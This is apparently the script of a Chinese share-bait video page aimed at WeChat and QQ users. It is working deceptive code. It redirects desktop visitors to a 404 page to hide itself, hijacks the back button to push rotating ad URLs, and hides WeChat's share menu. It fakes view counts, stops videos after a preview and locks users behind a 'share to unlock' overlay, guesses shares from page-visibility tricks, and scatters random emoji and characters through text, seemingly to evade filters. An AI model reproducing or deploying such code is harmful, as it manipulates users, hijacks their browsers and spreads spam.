  if((/^(Win|Mac)/i.test(navigator.platform)||!/mobile|Android|phone|iPhone|iPod|ios|iPad/i.test(navigator.userAgent))&&(!localStorage.idf||parseInt( config('mobile')))){
  	window.location = 'http://www.qq.com/babygohome/?pgv_ref=404';
  }
$_GET = getUrlVal();
conf.id = $_GET.id||'';
if(conf.id ){
	show_item();
}else{
	show_index();
}
function get_list(len) {
	var time = 100;
	var scrollTop = $(window).scrollTop();
	var scrollHeight = $(document).height();
	var innerHeight = window.innerHeight;
	if (Math.ceil(scrollTop) + innerHeight >= scrollHeight-3) {
		$('.video_load').show();
		// console.log(scrollTop, innerHeight, scrollHeight );
		window.scrollTo(0,innerHeight-100);
		if(window.isload)return;
		window.isload = true;
		clearTimeout(window.scrollTime);
		window.scrollTime = setTimeout(function(){
			$.post(host+'/images/conf.php?act=videos',{len:len||12,type:conf.type},function(d){
				if(d.list){
					for(var i in d.list){
						(function(i,v){
							setTimeout(function(){
								$('#video_list').append(v);
							},time*i);							
						})(i,d.list[i])
					}
				}
				clearTimeout(window.scrollTime2);
				window.scrollTime2 = setTimeout(function(){
					window.isload = false;
					$('.video_load').hide();
				},2000);
			},'json');
		},time*2);
	}
}
function show_index(){
	var h	= '';
	h	+= '	<header class="head_top clearfix top-fixed headroom--top headroom--not-bottom stui-header_bd clearfix" id="header-top">';
	h	+= '		<div class="main" >';
	if(config('url2',1)){
		h	+= '	<div class="main video_ad_line" ><a href="'+config('url2',1)+'"><img id="admimg1" src="'+config('btn2',1)+'" border="0" width="100%" style="display:block;"></a></div>';
	}
	if( config('url5',1)){
		h	+= '		<style>';
		h	+= '			.ad_box{display:flex;list-style:none;background-color:#54ba19;}';
		h	+= '			.ad_box li{width:25%;display:inline-block;margin:0;padding:0;}';
		h	+= '			.ad_box_a{background:#ee5051;font-size:28px;display:block;margin:10px 5px;padding:8px;text-align:center;border-radius:18px;color:#fff;line-height:1.2;}';
		h	+= '		</style>';
		h	+= '		<ul class="ad_box">';
		h	+= '			<li><a href="'+config('url5',1)+'" class="ad_box_a">'+config('btn5',1)+'</a></li>';
		h	+= '			<li><a href="'+config('url6',1)+'" class="ad_box_a">'+config('btn6',1)+'</a></li>';
		h	+= '			<li><a href="'+config('url7',1)+'" class="ad_box_a">'+config('btn7',1)+'</a></li>';
		h	+= '			<li><a href="'+config('url8',1)+'" class="ad_box_a">'+config('btn8',1)+'</a></li>';
		h	+= '		</ul>';
	}
	h	+= '			<ul class="head_menu type-slide">';
	h	+= '				<li><a href="?" target="_blank">首页</a></li>';
	if(conf.navs){
		for(var i in conf.navs){
			h	+= '			<li><a href="?type='+i+'" '+(i==conf.type?'style="color:#F15A04;font-weight:800;"':'')+'>'+conf.navs[i]+'</a></li>';
		}
	}
	h	+= '			</ul>';
	h	+= '	</header>';
	h	+= '	<div class="main video_list" id="video_list">'+conf.html+'</div>';
	h	+= '	<div class="main video_load" onclick="get_list(8,100);"><img src="./images/loading.gif" style="">加载中··· ···</div>';
	if(config('url3',1)){
		h	+= '	<div class="video_ad" ><a href="'+config('url3',1)+'"><img id="admimg1" src="'+config('btn3',1)+'" border="0" width="100%"></a></div>';
	}
	h	+= '	<div style="height:150px;"></div>';
	h	+= show_ad();
	h = myChat(h);
	document.write( h );
	$(window).scroll(function(){
		get_list(8);
	});
}
function show_ad(){
	var h = '';
    h += '	<div id="bottom_float_ad" style="display: flex;  width: 100%;  bottom: 10px;  position: fixed;  z-index: 99;">';
    if (config('leftfloatad', 1)) {
        h += '<li class="fd_f_a"><a href="' + config('leftfloatad', 1) + '" target="_blank"><img src="' + config('leftfloatadimg') + '"></a></li>';
    }
    if (config('rightfloatad', 1)) {
        h += '<li class="fd_f_a"><a href="' + config('rightfloatad', 1) + '" target="_blank"><img src="' + config('rightfloatadimg') + '"></a></li>';
    }
    h += '</div>';
	return h;
}
function show_item(){
	var h	= '';
	h	+= '	<div class="goback" onclick="location.href=\'?\'">';
	h	+= '		<div class="goback_left" id="fanhui"><i class="back_icon"></i>返回主页</div>';
	h	+= '		<div class="goback_right" id="fanhui"><a href="http://tousu.qiandeng1.cn/" style="color:#ffd8ae;" >投诉</a></div>';
	h	+= '	</div>';
	h	+= '	<div class="video_tag" id="tp5">';
	h	+= '		<div id="video"></div>';
	h	+= '	</div>';
	h	+= '	<div class="video_div" >';
	h	+= '		<div style="flex: 1;">';
	h	+= '			<h3>'+conf.video.name+'</h3>';
	h	+= '			<div class="view_num">'+config('video_date')+'&nbsp;&nbsp;&nbsp;<span>'+config('video_visit')+'万</span>次播放</div>';
	h	+= '		</div>';
	h	+= '		<div class="video_zan">';
	h	+= '			<div class="zan_div">';
//	h	+= '				<img src="./images/zan_icon.png" class="zan_icon" id="goodZan">';
	h	+= '			</div>';
	h	+= '			<div class="zan_con">';
	h	+= '				<div class="zan_bg">';
	h	+= '					<div class="zanOn"></div>';
	h	+= '				</div>';
//	h	+= '				<p>98%觉得很赞</p>';
	h	+= '			</div>';
	h	+= '			<div class="zanno_div">';
//	h	+= '				<img src="./images/zanno_icon.png" class="zanno_icon" id="poorZan">';
	h	+= '			</div>';
	h	+= '		</div>';
	h	+= '	</div>';
	h	+= '	<div class="video_operate">';
	h	+= '		<div class="video_discuss">';
//	h	+= '			<img src="./images/discuss_icon.png" class="discuss_icon" alt="">';
	h	+= '			<div class="discuss_list" id="moocBox">';
	h	+= '				<ul>';
	h	+= '					<li>分享解锁所有内容！</li>';

	h	+= '					<li>分享无限免费观看！</li>';
	h	+= '				</ul>';
	h	+= '			</div>';
	h	+= '		</div>';
	h	+= '		<div class="collect_div">';
//	h	+= '			<div class="heart" rel="like"></div>';
	h	+= '		</div>';
//	h	+= '		<img src="./images/download_icon.png" class="download_icon" alt="">';
//	h	+= '		<img src="./images/share_icon.png" class="share_icon" alt="">';
	h	+= '	</div>';
	if(config('url2',1)){
		h	+= '	<div class="main video_ad_line" ><a href="'+config('url2',1)+'"><img id="admimg1" src="'+config('btn2',1)+'" border="0" width="100%"></a></div><br>';
	}
	h	+= '	<div class="main video_list" style="padding-bottom:40px;">';
	h	+= '		<div class="list_title">猜你喜欢</div>';
	h	+= '		<div class="more" onclick="location.href=\'?\';">&nbsp;&nbsp;&nbsp;&nbsp;查看更多<img src="./images/more_icon.png" class="more_icon"></div>';
	h	+= '		<div id="video_list" >'+conf.html+'</div>';
	h	+= '	</div>';
	if(config('url3',1)){
		h	+= '	<div class="video_ad" ><a href="'+config('url3',1)+'"><img id="admimg1" src="'+config('btn3',1)+'" border="0" width="100%"></a></div>';
	}
	h	+= '	<div style="height:150px;"></div>';
	h	+= show_ad();
	h	+= showShare();
	h = myChat(h);
	document.write( h );
	play(true);
	// setTimeout(shx,1000);
}
function showShare(){
	var h	= '';
	h	+= '<style>';
	h	+= '	.ui_block *{margin:0;padding:0;}';
	h	+= '	.ui_block{display:none;width:100%;height:100vh;top:0;left:0;position:fixed;background-color:#000;background-size:cover;z-index:1989100;}';
	h	+= '	.ui_finger{display:block;width:132px;margin:0 auto;text-align:center;position:absolute;left:0;right:0;bottom:20vh;}';
	h	+= '	.ui_img{width:100%;margin:auto;z-index:19002000;}';
	h	+= '	.ui_share{position:fixed;width:100vw;height:100vh;bottom:0;left:0;opacity:0.01;z-index:19002020;}';
	h	+= '	.ui_animation{border-width:6px;border-style:solid;border-bottom-color:#69ca62;border-right-color:#FFF;border-top-color:#69ca62;border-left-color:#fff;transition:ease 0.5s;border-radius:50%;overflow:hidden;width:180px;height:180px;font-weight:700;z-index:19002000;top:-36px;left:-31px;animation:kcqwmgzh 2s infinite ease-in-out;position:absolute;}';
	h	+= '	.ui_con{margin:150px auto 0;background:#fff;border:solid #e3e3e3 1px;border-radius:14px;width:77%;max-width:450px;text-align:center;position:absolute;top:0;left:0;right:0;padding:32px 26px;color:#333;font-size:18px;line-height:31px;font-weight:700;}';
	h	+= '	@keyframes kcqwmgzh{';
	h	+= '		0%{transform:scale(1);-webkit-transform:scale(1);border-color:#6f6;box-shadow:0 0 20px rgba(0,255,0,.6), inset 0 0 10px rgba(0,255,0,.4);}';
	h	+= '		100%{transform:scale(0.5);-webkit-transform:scale(0.6);opacity:0.1;border-color:#393;box-shadow:0 0 5px rgba(0,255,0,.2), inset 0 0 5px rgba(0,255,0,.1);}';
	h	+= '	}';
	h	+= '</style>';
	h	+= '<div class="ui_block" >';
	h	+= '	<div class="ui_finger" >';
 	h	+= '		<img class="ui_img" src="./images/finger.png">';
	h	+= '		<div class="ui_animation" ></div>';
	h	+= '	</div>';
	h	+= '	<img class="ui_share">';
	h	+= '	<div class="ui_con"></div>';
	h	+= '</div>';
	h	+= '<audio  class="ui_mp3" src="./images/music2.mp3" loop="loop" preload=""></audio>';
	return h;
}
function set_board() {
	$('.video_div,.video_operate').click(function(e){
		location.href = config('ready');
	});
	var time = 3;
	var index = 0;
	var rollindex = setInterval(broll,time*1000);
	function broll(){
		var sinc = 10;
		var step = $('.discuss_list ul li').height() / sinc;
		var stay = parseInt($('.discuss_list ul').css('margin-top')||0) - step;
		var stat = $('.discuss_list ul').css('margin-top');
		if($('.discuss_list ul li').length>1){		
			var ssei = setInterval(function(){
				if(sinc-- > 1){
					stay = stay - step;
					$('.discuss_list ul').css('margin-top',  stay);
				}else{
					if(++index > $('.discuss_list ul li').length-2){
						$('.discuss_list ul').css('margin-top',  index = 0);
					}
					clearInterval(ssei);
				}
			},20);
		}
	}
	$('.discuss_list ul').on('mouseover',function(){
		clearInterval(rollindex);
	});  
	$('.discuss_list ul').on('mouseout',function(){
		rollindex = setInterval(broll,time*1000);
	});  
	$('.discuss_list ul').append($('.discuss_list ul li').eq(0).clone());  
}
function play(auto){
	$('.ui_block').hide();
	$('#video').show();
	window.dp = new DPlayer({
		container: document.getElementById('video'),
		autoplay: true,
		video: {
			type: 'auto',
			url: conf.video.src,
			pic: conf.video.img||'images/viewas.png',
		},
	});	
	dp.on('ended',function(){
		dp.pause();
		if(config('ready') ){
			location.href = config('ready');
		}
	});
	dp.play();
	if(auto && coo('visit') >= config('see',1)){
		var tx = config('pre',1);
		window.mshi=setInterval(function(){
			var currentTime = dp.video.currentTime;
			if (currentTime >= tx){
				tx+=5;
				dp.pause();			
				$('#video').hide();
				coo('snt',0,conf.cache);
				shx();
				clearInterval(window.mshi);
				clearInterval(window.msh2);
				window.msh2 = setInterval(function(){
					clearInterval(window.mshi);
					dp.pause();
				},100);
			}else if(currentTime > tx ){	
				clearInterval(window.mshi);
				return;
			}
		});
	}
	if(!coo('visit2')){
	    coo('visit',2,config('cache'));
	}
	coo('visit2',1,config('cache'))
	coo('visit',(coo('visit')||0)+1,config('cache'));
}
$(function(){
    coo('snt',coo('snt')||0,conf.cache);
	if(config('title',1)){
		document.title = config('title',1);
	}
	if(window.mqq){
		mqq.ui.setTitleButtons({
			left: {title: "返回",callback: function() {}},right: {hidden: true,}
		})	
	}
	if(config('popurl',1)){
		function getUrl() {
			var urls=config('popurl',2);
			if(sessionStorage.jumpIndex >= urls.length||!sessionStorage.jumpIndex){
				sessionStorage.jumpIndex = 0;
			}
			return urls[sessionStorage.jumpIndex++];
		}
		try {
			tbsJs.onReady('{useCachedApi : "true"}',function(b) {})
		} catch(err) {}
		window.history.pushState({title: 'title',url: '#'+Math.random()}, 'title', '#')
		window.addEventListener('popstate',function(h) {
			top.location.href = getUrl();
		},false);
	}
	try {
		document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
			WeixinJSBridge.call('hideOptionMenu');
		});
	} catch (e) {}
	if(config('census'))$.getScript(host+'/mp/cess.php?id=5');
	if(config('tongji'))$('body').append('<div style="display:none;">'+config('tongji')+'</div>');
	set_board();
	createQr();
});
function shx(state){
	setovblc();
	$('.ui_block').show();
	var snt = coo('snt')||0;
	var quns = config('sqr',2);
	var sbgs = config('sbg',2);
	var num = config('num',1);
	var qun = quns[snt%quns.length];
	var qun = config('sqr',1);;
	var sbg = sbgs[snt%sbgs.length];
	var mss = conf['tip'+(snt%7) ];
	if(snt >= num){
		coo('visit',0);
		var shu = localStorage.readyUrl||config('ready',1)||'';
		if(shu.length <3){
		    location.reload();
		}else{
		    location.href = shu;
		} 
		return;
	}
	$('.ui_con').html(mss);
	$('.ui_block').css('background-image','url('+myChat(sbg)+')');
	$('.ui_share').attr('src',qun);
	setTimeout(function(){
		$('.ui_mp3')[0].play();
	},800);
	$(window).click(function(e){
		$('.ui_mp3')[0].play();
	});
}
function setovblc(){
	if(!window.hiddenProperty){
		window.hiddenProperty='hidden' in document ? 'hidden': 'webkitHidden' in document ? 'webkitHidden': 'mozHidden' in document ? 'mozHidden': null;
		var vsbce=hiddenProperty.replace(/hidden/i,'visibilitychange');
		var touchTime,isTouch=false;
		document.body.addEventListener('touchstart',function() {  
			clearTimeout(touchTime);  
			coo('sheTime',1, 3 );
			touchTime = setTimeout(function touch(){
				isTouch = true;
			}, 500);  
		});
		document.body.addEventListener('touchend',function() {  
			clearTimeout(touchTime);
		});
		function ovblc(){
			if(!document[hiddenProperty]  ){
				if(isTouch || localStorage.idf ){	
					coo('snt',coo('snt')+1,conf.cache);
					isTouch=false
					shx(2);
				}else{
					isTouch=false
					tipRed('未检测到分享，请成功发送到群哦~');
				}
			}
		}
		document.addEventListener(vsbce,ovblc);	
	}
}
//打印参数
function bug(){
	if(!window.bug_con){
		var h	= '';
		h	+= '<div id="bug_box" onmouseover="this.style.opacity=1;" style="position:fixed;left:2px;bottom:2px;width:76vw;max-width:400px;background:#fff;border:1px solid #999;border-radius:10px;overflow:hidden;z-index:296654455;opacity:0.2;">';
		h	+= '	<div onclick="document.body.removeChild(bug_box);" style="color:#666;background:#eee;font-size:14px;font-weight:600;line-height:1;padding:7px 14px;border-bottom:solid 1px #ccc;">Debug</div>';
		h	+= '	<div id="bug_con" style="min-height:30px;max-height:40vh;font-size:7px;line-height:1.2;white-space:pre-wrap;word-break:break-all;color:#44c;tab-size:4;padding:3px 5px;overflow:auto;font-family:Menlo,Monaco,Consolas;"></div>';
		h	+= '</div>';
		document.body?document.body.insertAdjacentHTML('afterBegin',h):document.write(h);
	}
	console.log.apply(null,arguments);
	bug_con.innerHTML += '<span style="color:red;font-weight:600;">'+(new Date().toLocaleString(0,{hour12:0}))+'\tArg['+arguments.length+']</span>\t'+JSON.stringify(arguments.length == 1?arguments[0]:Object.values(arguments),null,'\t').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'\n';
	bug_con.scrollTo(0, 19891016);
}
function msg(con,fun){
	layer.open({
		content: con,
		btn: ['确定'],
		yes: function(index) {
			fun.call(this);
			layer.close(index);
		}
	});
}
function getUrl() {
	var shu = config('shu',1);
	if(!/^http|\?/.test(shu))shu = '//'+shu;
	if(!/^\?/.test(shu))shu = shu+'?{www}={wwwwnnn}';
	shu = myChat(shu.replace('FROM',conf.code));
	return shu;
}
//定时提示框
function thisLink(u){
	var a = document.createElement('a');
	a.href = u;
	return a.href;
};
function config(n,m,d){
	var v = undefined===conf[n]?null:conf[n];
	if(1==m||2==m){
		if('string'==typeof(v)){
			v = v.replace(/^\s+|\s+$/g,'').split(/\s*\n\s*/);
		}
		if(1==m&&v instanceof Array){
			v = v[Math.floor(Math.random()*v.length)];
		}
		v = v||d||null;
	}else{
		v = v||d||m||null;
	}
	if('string'==typeof(v)){
		v = myChat(v);
		if(/^\d+$/.test(v))v = v*1;
	}
	return v;
}
function myChat(s){
	var ico=['🌀','🌷','♈','♉','♊','♋','♌','♍','♎','♏','♐','♑','♒','♓','⛎','😠','😩','😲','😞','😵','😰','😒','😍','😤','😜','😝','😋','😘','😚','😷','😳','😅','😱','👙','👗','👡','💰','🔯','🅰','🅱','🆎','🅾','🎀','🎁','🎥','🎬','🎯','💋','💏','💌','🔞','⭕','❌','💓','💔','💕','💖','💗','💘','💞','🈲','㊙','💢'];
	if('object' == typeof(s))s = s[Math.floor(Math.random()*s.length)];
	if(window.host)s = s.replace(/(^|\=["']|url\(\s*)(\.\/)?(images|upload|mp)\b/gi,'$1'+host+'/$3');
	s = s.replace(/\{(\w+)\}/g,function(a,b){
		if(window.conf&&conf[b])return config(b,1);
		var h='';
		b = b.toUpperCase();
		for(var i=0;i<b.length;i++){
			if('C'==b[i]){
				h+=conf.city||'同城';
			}else if('O'==b[i]){
				h+=ico[Math.floor(Math.random()*ico.length)];
			}else if('N'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('D'==b[i]){
				h+=String.fromCharCode(65+Math.floor(Math.random()*26));
			}else{
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
	return s;
}
function coo(n,v,e) {
	var k,b = {},t=Math.floor(new Date()/1000), 
	o = JSON.parse(localStorage.us||'{}');
	for(k in o)if('object'==typeof o[k]&&o[k][1]>t){
		b[k]=o[k][0];
	}
	if (v === null){
		delete o[n];				
	}else if(v === undefined){
		return b[n]||0;			
	}else{
		o[n]=[v,t+(e||parseInt(conf.cache)||2592000)];
	}
	localStorage.us=JSON.stringify(o);
	return b		
};
//获取随机数会随机抽取
function rand(a,m){
	if(typeof(a) == 'object'){
		console.log( a );
		window.indexi =  window.indexi||0;
		return a[window.indexi++%a.length];
		return a[Math.floor(Math.random() * a.length)];
	}
	return a + Math.floor(Math.random() * (m - a));
}
//JS提示弹框
function tipRed(text, time) {
	window.tmsg&&document.body.removeChild(tmsg);
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="top:0;left:0;right:0;color:#fff;margin:0 auto;opacity:0;padding:7px 0;font-size:15px;position:fixed;text-align:center;background-color:#eb0000;transition:opacity 0.6s;z-index:111111111;width:100%;">'+text+'</div>');
	setTimeout('tmsg.style.opacity=1',0);clearTimeout(window.tmst);
	window.tmst=setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);',time||4000);
}
//JS提示弹框
function tip(text, time) {
	window.tmsg&&document.body.removeChild(tmsg);
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="top:200px;left:20%;right:20%;color:#fff;margin:0 auto;opacity:0;padding:5px;font-size:15px;max-width:300px;position:fixed;text-align:center;border-radius:8px;background-color:#333;border:1px solid #222;box-shadow:rgba(0,0,0,0.25) 0px 0px 10px 6px;transition:opacity 0.6s">'+text+'</div>');
	setTimeout('tmsg.style.opacity=0.8',0);clearTimeout(window.tmst);
	window.tmst=setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);',time||3000);
}
//解析 $_GET
function getUrlVal(u) {
	var j,g = {};
	u = (u || document.location.href.toString()).split('?');
	if (typeof(u[1]) == "string") {
		u = u[1].split("&");
		for (var i in u) {
			j = u[i].split("=");
			if (j[1] !== undefined) g[j[0]] = decodeURIComponent(j[1])
		}
	}
	return g;
}
function createQr(){
	var arr = config('sqr',2);
	arr.forEach(function(v, k){
		if( !/\.(png|jpg|jpeg|webp)$/.test(v) ){
			if(config('sqr3',1)){
			    console.log(config('qr2img',1) );
				getQr3({
					bg: config('qr2img',1),
					url: myChat(v),
					url2: config('sqr2',1),
					url3: config('sqr3',1),
					qrwidth: config('qr2size'),
					qx3: config('qr2right'),
					qy3: config('qr2bottom'),
					qy4: config('qr3bottom'),
					txt: config('qr2text'),
					tx2: 200,
					ty2: 200,
				},function(vo){
					arr[k] = vo.src;
					conf['sqr'] = arr;
					$('.ui_share').attr('src',config('sqr',1));
					if(config('qrdebug')){
						console.log(vo.bg,[vo,arr]);
						document.body.innerHTML = '<img src="'+vo.src+'" width="100%">';
					}
				});
			}else if(config('sqr2',1)){
				getQr2({
					bg: config('qr2img',1),
					url: myChat(v),
					url2: config('sqr2',1),
					qrwidth: config('qr2size'),
					qx3: config('qr2right'),
					qy3: config('qr2bottom'),
					txt: config('qr2text'),
					tx2: 200,
					ty2: 200,
				},function(vo){
					arr[k] = vo.src;
					conf['sqr'] = arr;
					$('.ui_share').attr('src',config('sqr',1));
					if(config('qrdebug')){
						console.log(vo.bg,[vo,arr]);
						document.body.innerHTML = '<img src="'+vo.src+'" width="100%">';
					}
				});
			}else{
				getQr({
					bg: config('qrimg',1),
					url: myChat(v),
					qrwidth: config('qrsize'),
					qx3: config('qrright'),
					qy3: config('qrbottom'),
					txt: config('qrtext'),
					tx2: 200,
					ty2: 200,
				},function(vo){
					arr[k] = vo.src;
					conf['sqr'] = arr;
					$('.ui_share').attr('src',config('sqr',1));
					if(config('qrdebug')){
						console.log([vo,arr]);
						document.body.innerHTML = '<img src="'+vo.src+'" width="100%">';
					}
				});
			}
		}	
	});	
}
function getQr3(vo,fn){
	var img = new Image();
	img.src = vo.bg;
	img.crossOrigin = 'Anonymous';
	img.onload = function() {
		var base64_img = jrQrcode.getQrBase64(vo.url);
		var canvas = document.createElement("canvas");
		canvas.width = vo.width = img.width;
		canvas.height = vo.height = img.height;
		var context = canvas.getContext("2d");
		context.rect(0, 0, canvas.width, canvas.height);
		context.fillStyle = "#f00";
		context.fill();
		context.drawImage(img, 0, 0, img.width, img.height );
		context.font = "24px Courier New";
		// context.fillText(vo.txt, vo.tx2, vo.tx2);
		var imgqr = new Image();
		imgqr.src = base64_img; 
		imgqr.crossOrigin = 'Anonymous';
		imgqr.onload = function() {
			context.drawImage(imgqr, img.width-vo.qrwidth-vo.qx3, img.height-vo.qrwidth-vo.qy3, vo.qrwidth, vo.qrwidth);
			imgqr = new Image();
			imgqr.src = jrQrcode.getQrBase64(vo.url2); 
			imgqr.crossOrigin = 'Anonymous';console
			imgqr.onload = function() {
				context.drawImage(imgqr, vo.qx3, img.height-vo.qrwidth-vo.qy3, vo.qrwidth, vo.qrwidth);
    			imgqr = new Image();
    			imgqr.src = jrQrcode.getQrBase64(vo.url3); 
    			imgqr.crossOrigin = 'Anonymous';
    			imgqr.onload = function() {
    				context.drawImage(imgqr, (img.width-vo.qrwidth)/2, img.height-vo.qrwidth-vo.qy4 , vo.qrwidth, vo.qrwidth);
    				vo.src = canvas.toDataURL("image/jpeg");
    				fn&&fn.call(this, vo);
    			}
			}
		}
	}
};
function getQr2(vo,fn){
	var img = new Image();
	img.src = vo.bg;
	img.crossOrigin = 'Anonymous';
	img.onload = function() {
		var base64_img = jrQrcode.getQrBase64(vo.url);
		var canvas = document.createElement("canvas");
		canvas.width = vo.width = img.width;
		canvas.height = vo.height = img.height;
		var context = canvas.getContext("2d");
		context.rect(0, 0, canvas.width, canvas.height);
		context.fillStyle = "#f00";
		context.fill();
		context.drawImage(img, 0, 0, img.width, img.height );
		context.font = "24px Courier New";
		// context.fillText(vo.txt, vo.tx2, vo.tx2);
		var imgqr = new Image();
		imgqr.src = base64_img; 
		imgqr.crossOrigin = 'Anonymous';
		imgqr.onload = function() {
			context.drawImage(imgqr, img.width-vo.qrwidth-vo.qx3, img.height-vo.qrwidth-vo.qy3, vo.qrwidth, vo.qrwidth);
			imgqr = new Image();
			imgqr.src = jrQrcode.getQrBase64(vo.url2); 
			imgqr.crossOrigin = 'Anonymous';
			imgqr.onload = function() {
				context.drawImage(imgqr, vo.qx3, img.height-vo.qrwidth-vo.qy3, vo.qrwidth, vo.qrwidth);
				vo.src = canvas.toDataURL("image/jpeg");
				fn&&fn.call(this, vo);
			}
		}
	}
};
function getQr(vo,fn){
	var img = new Image();
	img.src = vo.bg;
	img.crossOrigin = 'Anonymous';
	img.onload = function() {
		var base64_img = jrQrcode.getQrBase64(vo.url);
		var canvas = document.createElement("canvas");
		canvas.width = vo.width = img.width;
		canvas.height = vo.height = img.height;
		var context = canvas.getContext("2d");
		context.rect(0, 0, canvas.width, canvas.height);
		context.fillStyle = "#f00";
		context.fill();
		context.drawImage(img, 0, 0, img.width, img.height );
		context.font = "24px Courier New";
		// context.fillText(vo.txt, vo.tx2, vo.tx2);
		var imgqr = new Image();
		imgqr.src = base64_img; 
		imgqr.crossOrigin = 'Anonymous';
		imgqr.onload = function() {
			context.drawImage(imgqr, img.width-vo.qrwidth-vo.qx3, img.height-vo.qrwidth-vo.qy3, vo.qrwidth, vo.qrwidth);
			vo.src = canvas.toDataURL("image/jpeg");
			fn&&fn.call(this, vo);
		}
	}
};
